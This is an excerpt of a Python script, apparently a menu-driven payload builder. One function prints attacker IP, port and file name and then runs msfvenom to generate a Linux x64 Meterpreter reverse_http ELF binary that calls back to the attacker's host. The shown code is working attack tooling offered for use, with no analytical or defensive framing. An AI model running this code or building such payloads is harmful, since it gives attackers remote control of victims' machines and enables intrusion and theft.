...
def li64_http():
    os.system("clear")
    print(banner)
    print("Using: linux/x64/meterpreter/reverse_http")
    ...
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: linux/x64/meterpreter/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p linux/x64/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" -f elf >> "+name+".elf")
